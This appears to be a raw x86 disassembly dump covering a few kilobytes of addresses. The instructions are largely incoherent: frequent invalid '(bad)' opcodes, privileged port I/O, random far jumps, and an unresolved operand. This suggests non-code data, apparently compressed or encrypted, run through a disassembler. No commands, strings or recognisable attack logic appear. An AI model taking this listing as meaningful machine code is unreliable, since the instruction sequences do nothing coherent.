  42222b:	mov    dl,0xbd
  42222d:	push   eax
  42222e:	add    eax,0xa94404b1
  422233:	xor    ebp,edi
  422235:	(bad)  
  422236:	jmp    0x5f9f73e5
  42223b:	dec    esp
  42223c:	xor    eax,0x2a90befa
  422241:	push   es
  422242:	inc    edi
  422243:	mov    dl,0xaf
  422245:	pusha  
  422246:	sbb    al,dh
  422248:	jle    0x422298
  42224a:	repz or edx,DWORD PTR [eax+ebx*2+0x2f3cf2e0]
  422252:	loope  0x4221df
  422254:	mov    eax,DWORD PTR [ebp-0x60ade1f0]
  42225a:	sbb    dl,BYTE PTR [edi+esi*4]
  42225d:	enter  0xe012,0xa5
  422261:	or     BYTE PTR ds:0x864d237,0x26
  422268:	ret    0x5385
  42226b:	ret    
  42226c:	mov    ds:0x5b3b730b,eax
  422272:	sbb    DWORD PTR es:[eax],eax
  422275:	add    DWORD PTR ds:0x61b00357,edx
  42227b:	fs mov ecx,0x2bc11e40
  422281:	stos   DWORD PTR es:[edi],eax
  422282:	scas   eax,DWORD PTR es:[edi]
  422283:	add    BYTE PTR [eax+0x61],dh
  422286:	cld    
  422287:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422288:	xchg   edx,eax
  422289:	hlt    
  42228a:	aad    0x11
  42228c:	xchg   ecx,eax
  42228d:	or     ebp,DWORD PTR [edi+0x16]
	...
  4222f4:	(bad)  
  4222f5:	in     eax,dx
  4222f6:	lods   eax,DWORD PTR ds:[esi]
  4222f7:	imul   edi
  4222f9:	neg    edi
  4222fb:	std    
  4222fc:	sub    ebx,DWORD PTR [ebp+0x71]
  4222ff:	dec    ecx
  422300:	dec    edx
  422301:	fisubr WORD PTR [ebx-0x2d]
  422304:	cmp    al,0x6c
  422306:	add    DWORD PTR [eax],eax
  422308:	add    al,0x1
  42230a:	add    BYTE PTR [eax],al
  42230c:	push   edx
  42230d:	or     eax,edx
  42230f:	mov    es,WORD PTR [ecx]
  422311:	and    esp,DWORD PTR [esi-0x642dfcb5]
  422317:	xchg   edi,eax
  422318:	sar    BYTE PTR [edx],0xae
  42231b:	jmp    0xdcca:0x48fada53
  422322:	repz add esp,0x598f2470
  422329:	mov    al,ds:0x4d3ef96b
  42232e:	enter  0xa56b,0xb
  422332:	jns    0x422304
  422334:	push   ebp
  422335:	jecxz  0x422390
  422337:	test   al,0x3f
  422339:	int    0xd2
  42233b:	ret    0x5b30
  42233e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42233f:	inc    edi
  422340:	(bad)  
  422341:	(bad)  
  422342:	xchg   ebp,eax
  422343:	xchg   edi,eax
  422344:	loop   0x422320
  422346:	addr16 or eax,0xac35ac3a
  42234c:	test   eax,0x2bb1eef7
  422351:	mov    edi,ecx
  422353:	pop    edx
  422354:	mov    ah,0xd9
  422356:	out    0xe3,al
  422358:	into   
  422359:	xchg   BYTE PTR [ecx+0x7d],dl
  42235c:	and    BYTE PTR [esi],bh
  42235e:	inc    ecx
  42235f:	jo     0x4223ac
  422361:	mov    edx,0x16f8c73b
  422366:	mov    bl,0x71
  422368:	add    ebx,ebx
  42236a:	and    al,0xf3
  42236c:	repnz lods eax,DWORD PTR ds:[esi]
  42236e:	je     0x42232a
  422370:	mov    ecx,0x27bb6061
  422375:	not    DWORD PTR [esp+ebx*8-0x5022cd61]
  42237c:	lahf   
  42237d:	seto   BYTE PTR [eax+ebx*2]
  422381:	lods   al,BYTE PTR ds:[esi]
  422382:	js     0x4223fd
  422384:	xor    BYTE PTR [eax+ebx*2],cl
  422387:	out    0xb7,eax
  422389:	rol    DWORD PTR [edx],0xe
  42238c:	fnstcw WORD PTR [edi]
  42238e:	nop
  42238f:	and    eax,0x53bf0931
  422394:	xor    cl,BYTE PTR [ecx+0x5e]
  422397:	(bad)  
  422398:	or     BYTE PTR [eax-0xdeb15ab],cl
  42239e:	jl     0x422371
  4223a0:	scas   al,BYTE PTR es:[edi]
  4223a1:	ret    
  4223a2:	dec    edi
  4223a3:	or     al,0x2b
  4223a5:	push   ebp
  4223a6:	jbe    0x42238a
  4223a8:	icebp  
  4223a9:	mov    bl,ah
  4223ab:	ja     0x422385
  4223ad:	mov    edx,DWORD PTR [ebx-0x28]
  4223b0:	int    0x40
  4223b2:	test   al,0xb8
  4223b4:	pop    ss
  4223b5:	fldenv [edi-0x1]
  4223b8:	into   
  4223b9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4223ba:	push   esp
  4223bb:	out    0x6b,eax
  4223bd:	dec    ecx
  4223be:	sar    DWORD PTR [ebp-0x50e4ac3b],0x18
  4223c5:	mov    ah,0x29
  4223c7:	fcom   DWORD PTR [ecx-0x65974932]
  4223cd:	sbb    ch,dl
  4223cf:	and    eax,eax
  4223d1:	mov    edi,0x3a7d5e6c
  4223d6:	xor    eax,0x28a8e015
  4223db:	mov    bl,0x29
  4223dd:	mov    cl,BYTE PTR [ebx+edi*4+0x3489843]
  4223e4:	or     BYTE PTR [esi+0x7f],dh
  4223e7:	xchg   cl,ah
  4223e9:	test   DWORD PTR [edi],edi
  4223eb:	test   eax,0x7aa0273e
  4223f0:	xor    ecx,ebp
  4223f2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4223f3:	lods   al,BYTE PTR ds:[esi]
  4223f4:	adc    edi,ebp
  4223f6:	imul   esi,DWORD PTR [ebp-0x392355de],0x72
  4223fd:	push   ecx
  4223fe:	pop    ds
  4223ff:	ret    0x7292
  422402:	mov    ebp,0x12399380
  422407:	add    ebx,DWORD PTR [ebp+0x13]
  42240a:	rcr    DWORD PTR [eax+ebp*2+0x7],cl
  42240e:	mov    eax,0xd4
	...
  422473:	add    BYTE PTR [edx-0x7e],dl
  422476:	cs imul edi,esi,0xbbbb57ed
  42247d:	xor    ebp,esp
  42247f:	cdq    
  422480:	mov    al,ds:0x40000d98
  422485:	ins    DWORD PTR es:[edi],dx
  422486:	add    DWORD PTR [eax],eax
  422488:	add    al,0x1
  42248a:	add    BYTE PTR [eax],al
  42248c:	ret    0xa1d6
  42248f:	push   edi
  422490:	aaa    
  422491:	ins    BYTE PTR es:[edi],dx
  422492:	dec    esp
  422493:	jbe    0x42241b
  422495:	mov    eax,ds:0x22d14a7f
  42249a:	(bad)  
  42249b:	mov    ds:0xec53c079,eax
  4224a0:	inc    ecx
  4224a1:	or     dh,BYTE PTR [edi+0x596fa80b]
  4224a7:	xlat   BYTE PTR ds:[ebx]
  4224a8:	and    ebp,esi
  4224aa:	das    
  4224ab:	jae    0x4224e2
  4224ad:	fs add al,0x5a
  4224b0:	push   esp
  4224b1:	gs fld st(3)
  4224b4:	sub    eax,0xd0cbc32b
  4224b9:	call   0x7743:0xad6e61ba
  4224c0:	cmp    eax,0xc833e3d5
  4224c5:	xor    DWORD PTR [ebp-0x48],edx
  4224c8:	mov    ebp,0x11ade920
  4224cd:	jmp    0xe0fb:0xc4b67375
  4224d4:	rcl    DWORD PTR [ecx-0x43],1
  4224d7:	in     al,0x67
  4224d9:	ins    BYTE PTR es:[edi],dx
  4224da:	test   al,0x30
  4224dc:	or     al,0x49
  4224de:	std    
  4224df:	pop    ecx
  4224e0:	aad    0x8e
  4224e2:	cmp    BYTE PTR [ebp-0x21],ah
  4224e5:	add    eax,0x36922ba5
  4224ea:	or     DWORD PTR [edx],ebp
  4224ec:	or     ebp,edi
  4224ee:	in     eax,0x1a
  4224f0:	and    BYTE PTR [ebx-0x3f20b408],0x1d
  4224f7:	int    0x6e
  4224f9:	push   es
  4224fa:	dec    esi
  4224fb:	stos   BYTE PTR es:[edi],al
  4224fc:	pop    es
  4224fd:	push   0xc4f2267a
  422502:	aaa    
  422503:	pop    esi
  422504:	mov    dh,0xb3
  422506:	mov    al,0x1a
  422508:	dec    esi
  422509:	xor    BYTE PTR ds:0x30ff4d3,bl
  42250f:	test   BYTE PTR [eax],cl
  422511:	in     al,0x84
  422513:	xchg   DWORD PTR ds:0x978cad71,ecx
  422519:	jne    0x422524
  42251b:	in     al,dx
  42251c:	mov    DWORD PTR [ebx],esi
  42251e:	adc    eax,0x883d5e44
  422523:	push   es
  422524:	mov    ds:0xca2e3a4d,al
  422529:	into   
  42252a:	aas    
  42252b:	call   0x4cd18825
  422530:	test   al,0xf0
  422532:	cs fucom st(3)
  422535:	call   0x7be9:0x3e5586b7
  42253c:	cmc    
  42253d:	in     eax,dx
  42253e:	cld    
  42253f:	outs   dx,DWORD PTR ds:[esi]
  422540:	or     DWORD PTR [edi],eax
  422542:	jae    0x4224d4
  422544:	sub    al,0x6
  422546:	hlt    
  422547:	imul   ebx,DWORD PTR [ecx],0x66
  42254a:	lods   al,BYTE PTR ds:[esi]
  42254b:	mov    ds:0x404cf74a,al
  422550:	sub    al,0xf3
  422552:	jmp    0xa1c9fed7
  422557:	xchg   BYTE PTR [esi],cl
  422559:	inc    esi
  42255a:	xchg   DWORD PTR [edi-0x1b],eax
  42255d:	lods   al,BYTE PTR ds:[esi]
  42255e:	ja     0x422567
  422560:	jne    0x422537
  422562:	outs   dx,DWORD PTR es:[esi]
  422564:	sub    DWORD PTR [edx+0x1b],esp
  422567:	adc    al,0xbe
  422569:	adc    DWORD PTR [ebx],esp
  42256b:	or     al,0x19
  42256d:	or     al,0xbe
  42256f:	dec    ebp
  422570:	mov    ah,0x3
  422572:	push   ds
  422573:	imul   ebp,edx,0xe85c6ffa
  422579:	cmp    eax,0xc313d422
  42257e:	dec    esi
  42257f:	imul   ebp,esi,0x11bd4c4
  422585:	mov    ebx,ebx
  422587:	jge    0x42255b
  422589:	rcl    BYTE PTR [edx+0x79d0c1d8],0x0
	...
  4225f4:	call   0xfa77:0xbf778fae
  4225fb:	out    dx,eax
  4225fc:	sbb    esi,DWORD PTR [ecx-0x79f5d08]
  422602:	aas    
  422603:	out    0x44,al
  422605:	outs   dx,BYTE PTR ds:[esi]
  422606:	add    DWORD PTR [eax],eax
  422608:	add    al,0x1
  42260a:	add    BYTE PTR [eax],al
  42260c:	add    bl,ch
  42260e:	fild   DWORD PTR [edx+0x3ece5720]
  422614:	mov    esp,0x55e55a7e
  422619:	xor    BYTE PTR [ecx+0x5498ff5],0x49
  422620:	jns    0x422616
  422622:	mov    edx,?
  422624:	fldcw  WORD PTR [esi-0x50]
  422627:	nop
  422628:	pop    esp
  422629:	imul   ebx,DWORD PTR [ebp+ecx*1+0x7eedae7b],0x8abc1a8e
  422634:	es and eax,0x44dd4292
  42263a:	push   eax
  42263b:	jecxz  0x422605
  42263d:	xlat   BYTE PTR ds:[ebx]
  42263e:	clc    
  42263f:	das    
  422640:	xlat   BYTE PTR ds:[ebx]
  422641:	inc    eax
  422642:	xchg   esp,eax
  422643:	add    al,0xfb
  422645:	dec    edx
  422646:	push   ds
  422647:	cmp    BYTE PTR [ebp*1+0x1d602e7b],al
  42264e:	lock and DWORD PTR [eax],edx
  422651:	pop    esp
  422652:	pop    ecx
  422653:	int3   
  422654:	jb     0x4225ec
  422656:	xor    eax,0xaa94f753
  42265b:	xchg   ebx,eax
  42265c:	and    DWORD PTR [edi],esp
  42265e:	icebp  
  42265f:	sub    al,0xeb
  422661:	add    eax,0x4371f1b5
  422666:	or     ecx,DWORD PTR [ecx+0x4bc3807a]
  42266c:	int3   
  42266d:	inc    esi
  42266e:	pop    eax
  42266f:	cmp    esp,DWORD PTR [ecx+0x46339d49]
  422675:	dec    ecx
  422676:	repz push eax
  422678:	retf   
  422679:	dec    esp
  42267a:	and    BYTE PTR [esi+0x55],ch
  42267d:	push   ecx
  42267e:	iret   
  42267f:	out    0xfa,eax
  422681:	xor    eax,0xce943de7
  422686:	dec    ecx
  422687:	jmp    0xf9eea1ae
  42268c:	fucom  st(1)
  42268e:	inc    esi
  42268f:	cmp    BYTE PTR [edi-0x73],cl
  422692:	push   eax
  422693:	imul   edx,DWORD PTR [edx-0x58ac3267],0x5cf6f1dd
  42269d:	outs   dx,DWORD PTR ds:[esi]
  42269e:	or     al,0xa9
  4226a0:	dec    esp
  4226a1:	xchg   ebx,eax
  4226a2:	aad    0xb
  4226a4:	(bad)  
  4226a5:	pop    edi
  4226a6:	and    ch,BYTE PTR [esi]
  4226a8:	xor    BYTE PTR [ecx-0x5b],bh
  4226ab:	jns    0x42269a
  4226ad:	push   ebx
  4226ae:	sub    bh,ah
  4226b0:	addr16 ss xchg cl,bh
  4226b4:	repz inc ebp
  4226b6:	xor    al,bh
  4226b8:	lods   al,BYTE PTR ds:[esi]
  4226b9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4226ba:	mov    bl,bl
  4226bc:	ficomp WORD PTR [esi-0x38]
  4226bf:	repnz in al,dx
  4226c1:	jb     0x422658
  4226c3:	dec    esp
  4226c4:	mov    cl,0xf0
  4226c6:	cwde   
  4226c7:	inc    ebp
  4226c8:	test   eax,0x78710e83
  4226cd:	inc    ebp
  4226ce:	pop    esp
  4226cf:	dec    esp
  4226d0:	sub    BYTE PTR [edx-0x5063f45c],ch
  4226d6:	mov    esp,0x80fb4ca9
  4226db:	dec    edx
  4226dc:	dec    edx
  4226dd:	sti    
  4226de:	jle    0x42272d
  4226e0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4226e1:	scas   al,BYTE PTR es:[edi]
  4226e2:	adc    esp,DWORD PTR [ecx-0x6d]
  4226e5:	daa    
  4226e6:	jmp    0xfea2:0x94effb51
  4226ed:	push   ecx
  4226ee:	dec    edx
  4226ef:	in     eax,dx
  4226f0:	jp     0x422674
  4226f2:	mov    ds:0xfb8f6d9,al
  4226f7:	pop    ss
  4226f8:	enter  0xf7db,0x36
  4226fc:	gs xchg esi,eax
  4226fe:	cmp    ecx,edi
  422700:	dec    ebx
  422701:	mov    al,ds:0xf4a5f56c
  422706:	outs   dx,BYTE PTR ds:[esi]
  422707:	popa   
  422708:	mov    eax,ds:0xf8a29b64
  42270d:	and    BYTE PTR [edx+0x99],dl
	...
  422773:	add    BYTE PTR [edi],ah
  422775:	sub    eax,0x7d7f2d7d
  42277a:	ja     0x4227ab
  42277c:	mov    esi,0x2f7f01c8
  422781:	mov    esp,DWORD PTR [esi+0x16f489c]
  422787:	add    BYTE PTR [ecx+eax*1],al
  42278a:	add    BYTE PTR [eax],al
  42278c:	addr16 (bad) 
  42278e:	push   ecx
  42278f:	jg     0x4227aa
  422791:	mov    ch,0xa0
  422793:	mov    dl,0x99
  422795:	test   DWORD PTR [esi-0x53b3c6c2],edi
  42279b:	sub    bh,BYTE PTR [ebx-0x2f]
  42279e:	mov    cl,0xa6
  4227a0:	popa   
  4227a1:	pop    ebx
  4227a2:	call   0x1653:0x5c4b4643
  4227a9:	call   0x6f0b2e69
  4227ae:	int3   
  4227af:	pusha  
  4227b0:	xor    BYTE PTR [esi+0x7ce42a78],dh
  4227b6:	clc    
  4227b7:	pop    ebp
  4227b8:	jo     0x4227e6
  4227ba:	int    0x63
  4227bc:	scas   eax,DWORD PTR es:[edi]
  4227bd:	mov    ecx,0xa51cc45c
  4227c2:	cwde   
  4227c3:	push   edx
  4227c4:	pop    ds
  4227c5:	sbb    BYTE PTR [ebp+0x59],dl
  4227c8:	jmp    0x422811
  4227ca:	and    dh,BYTE PTR [edx+esi*4+0x46]
  4227ce:	lea    ecx,[ebx-0x6efde7dc]
  4227d4:	repz and DWORD PTR [ebx],edi
  4227d7:	jg     0x4227c9
  4227d9:	leave  
  4227da:	adc    BYTE PTR [esi-0x65],ah
  4227dd:	mov    ebx,0xce2c4e5
  4227e2:	ret    
  4227e3:	hlt    
  4227e4:	sub    BYTE PTR [edi-0x6b9104a3],al
  4227ea:	add    dl,bl
  4227ec:	aad    0x2c
  4227ee:	nop
  4227ef:	sbb    eax,0xe10b5b7e
  4227f4:	jno    0x42285d
  4227f6:	bound  ebp,QWORD PTR [ebp+0x58]
  4227f9:	call   0x5fa4:0x9b2e3c03
  422800:	daa    
  422801:	and    esp,esp
  422803:	jmp    0xeb71c56f
  422808:	jns    0x4227e7
  42280a:	rcl    BYTE PTR [ebx],cl
  42280c:	push   ss
  42280d:	or     al,0x3b
  42280f:	sti    
  422810:	loop   0x422820
  422812:	sbb    ecx,DWORD PTR [esi]
  422814:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422815:	pop    edx
  422816:	push   esi
  422817:	dec    ebx
  422818:	sbb    eax,0x4c6f8f0e
  42281d:	call   0x4f2808a8
  422822:	enter  0x8a57,0x35
  422826:	xor    DWORD PTR [edi-0x72a157ac],ebx
  42282c:	mov    edi,DWORD PTR [ebx+eiz*4+0x67fa53ae]
  422833:	and    eax,0xca4c1af7
  422838:	popf   
  422839:	das    
  42283a:	aaa    
  42283b:	push   0x61
  42283d:	mov    bl,0xf3
  42283f:	fist   WORD PTR [esi+0x301f703]
  422845:	out    0x3e,eax
  422847:	xchg   esp,eax
  422848:	sahf   
  422849:	in     eax,0xc
  42284b:	or     ebp,DWORD PTR cs:[edx+0x1d]
  42284f:	fwait
  422850:	call   0x47b2eb97
  422855:	iret   
  422856:	add    DWORD PTR [ebx+0x3b],0x26
  42285a:	mov    ecx,0x2cfe93d2
  42285f:	sub    al,0x6a
  422861:	aad    0xe9
  422863:	pop    ds
  422864:	inc    ebx
  422865:	das    
  422866:	xchg   DWORD PTR [edx+ebp*2+0x7d],ebx
  42286a:	cmp    DWORD PTR [eax+ebp*8+0x5d],0x2205b4e
  422872:	mov    eax,0xc10770a8
  422877:	pop    esp
  422878:	xchg   DWORD PTR [esi-0x2d2a6201],ebx
  42287e:	inc    ecx
  42287f:	test   eax,0xad8e44b6
  422884:	dec    eax
  422885:	xor    DWORD PTR cs:[eax],0xfa3ad54
  42288c:	scas   eax,DWORD PTR es:[edi]
  42288d:	inc    esi
  42288e:	aam    0x92
	...
  4228f4:	int    0x39
  4228f6:	mov    eax,0xef97fc97
  4228fb:	jnp    0x4228bb
  4228fd:	outs   dx,DWORD PTR ds:[esi]
  4228fe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4228ff:	loopne 0x422939
  422901:	test   al,0x37
  422903:	inc    ebx
  422904:	dec    esp
  422905:	jo     0x422908
  422907:	add    BYTE PTR [ecx+eax*1],al
  42290a:	add    BYTE PTR [eax],al
  42290c:	push   0x8f5e4ff4
  422911:	ins    DWORD PTR es:[edi],dx
  422912:	sbb    dh,BYTE PTR [eax+0x2c]
  422915:	das    
  422916:	xor    al,0xb4
  422918:	imul   ebp,DWORD PTR [ecx-0x17735b2d],0x9b91e5dd
  422922:	inc    ebx
  422923:	cwde   
  422924:	mov    bl,0xf4
  422926:	pop    ds
  422927:	jo     0x422992
  422929:	cmp    al,0x2b
  42292b:	lds    edi,FWORD PTR [edx+ebx*8+0x29]
  42292f:	popf   
  422930:	add    eax,0x2645e95
  422935:	push   esp
  422936:	sahf   
  422937:	(bad)  
  422938:	fdivr  st,st(2)
  42293a:	pop    ebx
  42293b:	jnp    0x4229b7
  42293d:	cmp    ah,BYTE PTR [ecx]
  42293f:	adc    esi,edx
  422941:	imul   edx,DWORD PTR [ecx-0x45],0xffffff98
  422945:	rol    cl,cl
  422947:	or     DWORD PTR [eax+0x56],edi
  42294a:	add    dl,BYTE PTR [edx-0x5d]
  42294d:	das    
  42294e:	sbb    al,0xf2
  422950:	(bad)  
  422951:	jp     0x422925
  422953:	adc    eax,0xaf836bd3
  422958:	jne    0x42298c
  42295a:	jmp    0x4229c3
  42295c:	in     eax,dx
  42295d:	hlt    
  42295e:	xor    eax,0xa78333f8
  422963:	popa   
  422964:	jae    0x4229c8
  422966:	enter  0xca54,0x20
  42296a:	out    0x68,eax
  42296c:	mov    ebx,0x75afdf4a
  422971:	ins    BYTE PTR es:[edi],dx
  422972:	lea    esi,[esi+0x7]
  422975:	xlat   BYTE PTR ds:[ebx]
  422976:	popa   
  422977:	rcl    ch,1
  422979:	mov    ds:0xa960d1e6,eax
  42297e:	cmp    ebx,edi
  422980:	xchg   BYTE PTR [edx],ah
  422982:	mov    ds:0x1fc24e3,eax
  422987:	cmp    ah,al
  422989:	ins    BYTE PTR es:[edi],dx
  42298a:	stc    
  42298b:	dec    edi
  42298c:	jp     0x422964
  42298e:	xlat   BYTE PTR ds:[ebx]
  42298f:	add    DWORD PTR [esi-0x2b],ebp
  422992:	sbb    eax,0xc0d65115
  422997:	test   BYTE PTR [ebx+0x44],0xca
  42299b:	shl    dh,0x6
  42299e:	add    BYTE PTR [ecx+0x7d033488],dl
  4229a4:	sbb    eax,0xde6cca7a
  4229a9:	in     eax,dx
  4229aa:	mov    bh,0xa3
  4229ac:	jecxz  0x422a23
  4229ae:	xchg   DWORD PTR [ebx+0x15fce2b9],edi
  4229b4:	jmp    0x422970
  4229b6:	imul   DWORD PTR [esi+0x7]
  4229b9:	cmp    eax,0x86c0605c
  4229be:	cmp    ch,BYTE PTR [ecx+ecx*1+0x46]
  4229c2:	ficom  DWORD PTR [ecx]
  4229c4:	push   esi
  4229c5:	dec    edi
  4229c6:	push   ebx
  4229c7:	inc    ecx
  4229c8:	inc    ecx
  4229c9:	fcomp  QWORD PTR [eax+esi*8-0x2]
  4229cd:	mul    DWORD PTR [edx-0x48f651c3]
  4229d3:	xor    BYTE PTR [ebp+eax*2-0x44],ah
  4229d7:	add    BYTE PTR [edi],0x1
  4229da:	icebp  
  4229db:	clc    
  4229dc:	in     eax,dx
  4229dd:	pop    ebp
  4229de:	sub    ch,0x20
  4229e1:	call   0x8b44156f
  4229e6:	and    al,0x98
  4229e8:	jmp    0x4229be
  4229ea:	into   
  4229eb:	fst    st(6)
  4229ed:	cli    
  4229ee:	cmp    ch,BYTE PTR [esi+0x1f]
  4229f1:	xchg   edx,eax
  4229f2:	and    eax,0x8b72c22
  4229f7:	push   eax
  4229f8:	jecxz  0x422a6e
  4229fa:	fnstenv [ebx]
  4229fc:	pop    ecx
  4229fd:	jbe    0x422a52
  4229ff:	fs mov dl,0xaf
  422a02:	jl     0x42299e
  422a04:	in     eax,dx
  422a05:	repnz daa 
  422a07:	mov    ds:0x3e46c763,eax
  422a0c:	aaa    
  422a0d:	jns    0x4229ce
  422a0f:	push   ebx
	...
  422a74:	xchg   esi,eax
  422a75:	push   0x18
  422a77:	mov    ah,bh
  422a79:	cli    
  422a7a:	xchg   esi,eax
  422a7b:	jle    0x422a4e
  422a7d:	push   esp
  422a7e:	je     0x422a3d
  422a80:	mov    ebx,0x508e3324
  422a85:	jno    0x422a88
  422a87:	add    BYTE PTR [ecx+eax*1],al
  422a8a:	add    BYTE PTR [eax],al
  422a8c:	stos   BYTE PTR es:[edi],al
  422a8d:	inc    ebx
  422a8e:	cdq    
  422a8f:	sbb    edi,esi
  422a91:	mov    ds:0xa70a0c89,al
  422a96:	loop   0x422ace
  422a98:	enter  0x8cc6,0x9a
  422a9c:	es int 0x4f
  422a9f:	repnz mov edi,0xf7144c42
  422aa5:	(bad)  
  422aa6:	ins    BYTE PTR es:[edi],dx
  422aa7:	xor    esp,DWORD PTR ds:0xbb055c18
  422aad:	pop    ebp
  422aae:	sub    al,0x57
  422ab0:	sti    
  422ab1:	or     esp,DWORD PTR ds:0x65c72853
  422ab7:	std    
  422ab8:	iret   
  422ab9:	xchg   BYTE PTR [ebx-0x2ac5eefc],bl
  422abf:	jl     0x422b3a
  422ac1:	loop   0x422b19
  422ac3:	aas    
  422ac4:	fcomp  st(7)
  422ac6:	pop    ebx
  422ac7:	jnp    0x422aee
  422ac9:	add    al,0x8b
  422acb:	lock retf 
  422acd:	mov    eax,ds:0xd4f25709
  422ad2:	lds    eax,FWORD PTR [ebx]
  422ad4:	jne    0x422b2e
  422ad6:	int3   
  422ad7:	inc    esi
  422ad8:	xchg   esp,eax
  422ad9:	nop
  422ada:	adc    bh,BYTE PTR [esi]
  422adc:	push   0x72b0c9c7
  422ae1:	leave  
  422ae2:	imul   ebp,DWORD PTR [esi-0x4da48f49],0x4a3b1323
  422aec:	jns    0x422ad4
  422aee:	sub    DWORD PTR [ebx-0x2910b6f],ebx
  422af4:	and    edx,DWORD PTR [ebp+0x22]
  422af7:	sahf   
  422af8:	out    dx,eax
  422af9:	test   eax,0x7dc63468
  422afe:	xchg   edi,eax
  422aff:	mov    dl,0xbd
  422b01:	inc    ecx
  422b02:	dec    edi
  422b03:	pop    ecx
  422b04:	adc    esi,DWORD PTR [ebx+0x19]
  422b07:	mov    ebx,0xf68732e1
  422b0c:	push   es
  422b0d:	jae    0x422b66
  422b0f:	call   0xf41808ff
  422b14:	xor    ah,BYTE PTR [edx-0xa]
  422b17:	dec    ebp
  422b18:	inc    esi
  422b19:	je     0x422ae0
  422b1b:	sbb    cl,BYTE PTR [edi]
  422b1d:	push   ecx
  422b1e:	sub    ecx,DWORD PTR [edi+0x4a]
  422b21:	pop    ebp
  422b22:	dec    ecx
  422b23:	fiadd  DWORD PTR [esi+0x0]
  422b26:	jne    0x422b75
  422b28:	inc    cx
  422b2a:	scas   eax,DWORD PTR es:[edi]
  422b2b:	fwait
  422b2c:	adc    eax,0xaf6cbe83
  422b31:	inc    edi
  422b32:	xor    bl,dh
  422b34:	int    0x30
  422b36:	and    DWORD PTR [ebx+0x6],eax
  422b39:	xor    eax,0xf3344933
  422b3e:	adc    DWORD PTR [edi],esi
  422b40:	fbstp  TBYTE PTR [edx+0xfd09d54]
  422b46:	popf   
  422b47:	cmp    BYTE PTR [esi-0x51],dl
  422b4a:	hlt    
  422b4b:	dec    eax
  422b4c:	jg     0x422ad1
  422b4e:	fstp   DWORD PTR [edx+0x135f11cc]
  422b54:	cmp    DWORD PTR [esi-0x5af2daee],edx
  422b5a:	sub    al,0x23
  422b5c:	shr    ebp,1
  422b5e:	pusha  
  422b5f:	xchg   edi,ebp
  422b61:	fistp  DWORD PTR [esi-0x26]
  422b64:	daa    
  422b65:	push   edx
  422b66:	in     eax,0xac
  422b68:	mov    eax,0x200be9b8
  422b6d:	cmp    ecx,DWORD PTR [edi+edi*2-0x4a5ca519]
  422b74:	push   es
  422b75:	sbb    al,0x89
  422b77:	sub    esi,DWORD PTR [esp+ebp*2-0x5a]
  422b7b:	xchg   ebp,eax
  422b7c:	xchg   edi,eax
  422b7d:	nop
  422b7e:	sub    al,0x5
  422b80:	dec    ebx
  422b81:	xchg   ecx,eax
  422b82:	(bad)  
  422b83:	out    0x55,al
  422b85:	test   DWORD PTR [eax-0x6c2f23d6],0x132a84f5
  422b8f:	mov    bl,0x0
	...
  422bf1:	add    BYTE PTR [eax],al
  422bf3:	add    BYTE PTR [edi+esi*1+0x4a],al
  422bf7:	fwait
  422bf8:	jnp    0x422bf9
  422bfa:	aad    0xff
  422bfc:	sbb    dl,BYTE PTR [edx+0x42d54d9c]
  422c02:	in     eax,dx
  422c03:	aam    0x54
  422c05:	jb     0x422c08
  422c07:	add    BYTE PTR [ecx+eax*1],al
  422c0a:	add    BYTE PTR [eax],al
  422c0c:	mov    edi,DWORD PTR [esi]
  422c0e:	ins    BYTE PTR es:[edi],dx
  422c0f:	mov    al,0x27
  422c11:	pop    edx
  422c12:	mov    ebp,0xee9646f9
  422c17:	and    ebp,DWORD PTR [eax]
  422c19:	pop    ds
  422c1a:	sbb    DWORD PTR ds:0xf4a6a46d,ecx
  422c20:	inc    ebp
  422c21:	icebp  
  422c22:	jmp    0x422c54
  422c24:	cmp    dl,BYTE PTR [esi+0x1378cb55]
  422c2a:	mov    DWORD PTR [ecx+0x44],esi
  422c2d:	and    BYTE PTR [ebp-0x5b],dh
  422c30:	lods   al,BYTE PTR ds:[esi]
  422c31:	xchg   esi,eax
  422c32:	mov    eax,ds:0xd1e4804f
  422c37:	sub    al,BYTE PTR [ebp+0x17]
  422c3a:	inc    ebp
  422c3b:	arpl   WORD PTR [eax+0x7a],dx
  422c3e:	pop    edx
  422c3f:	dec    ecx
  422c40:	jne    0x422bc9
  422c42:	push   esp
  422c43:	xchg   edx,eax
  422c44:	in     eax,0xc8
  422c46:	or     BYTE PTR [ebx+0x32],ah
  422c49:	xchg   esi,eax
  422c4a:	mov    eax,ds:0xf44a5e0d
  422c4f:	sub    bl,bl
  422c51:	mov    ebx,0x354d5f11
  422c56:	shl    DWORD PTR [eax-0x62909489],1
  422c5c:	imul   ecx,DWORD PTR [edx-0x2247dd47],0xfffffff0
  422c63:	lock nop
  422c65:	stos   BYTE PTR es:[edi],al
  422c66:	iret   
  422c67:	popf   
  422c68:	mov    esp,0xa039ae7
  422c6d:	xchg   BYTE PTR [eax],cl
  422c6f:	jecxz  0x422cc9
  422c71:	inc    ebp
  422c72:	sbb    bl,dh
  422c74:	add    ebp,DWORD PTR [ecx]
  422c76:	sub    ecx,DWORD PTR [ecx+0x715ae61d]
  422c7c:	call   0x4501:0xda132d8
  422c83:	stos   BYTE PTR es:[edi],al
  422c84:	push   eax
  422c85:	int3   
  422c86:	fcom   QWORD PTR [edi+0x358a616e]
  422c8c:	xchg   ebp,eax
  422c8d:	(bad)  
  422c8e:	jge    0x422ce7
  422c90:	xchg   ebp,eax
  422c91:	(bad)  
  422c92:	mov    edx,0x9543a9ca
  422c97:	mov    ebp,0xdf0576b8
  422c9c:	dec    esp
  422c9d:	(bad)
  422ca1:	les    edi,FWORD PTR [edi-0x15]
  422ca4:	push   esp
  422ca5:	out    dx,eax
  422ca6:	push   ecx
  422ca7:	or     ecx,DWORD PTR [esi-0x18]
  422caa:	scas   eax,DWORD PTR es:[edi]
  422cab:	rcl    DWORD PTR [edx+0x167c146e],1
  422cb1:	fld    DWORD PTR ds:0xd2cb9ebc
  422cb7:	xchg   edi,eax
  422cb8:	fisubr DWORD PTR [esi+0x7e]
  422cbb:	(bad)  
  422cbd:	adc    al,0x74
  422cbf:	jmp    0xe961:0x7ef2064a
  422cc6:	jo     0x422ccd
  422cc8:	mov    ebp,0x72c168f2
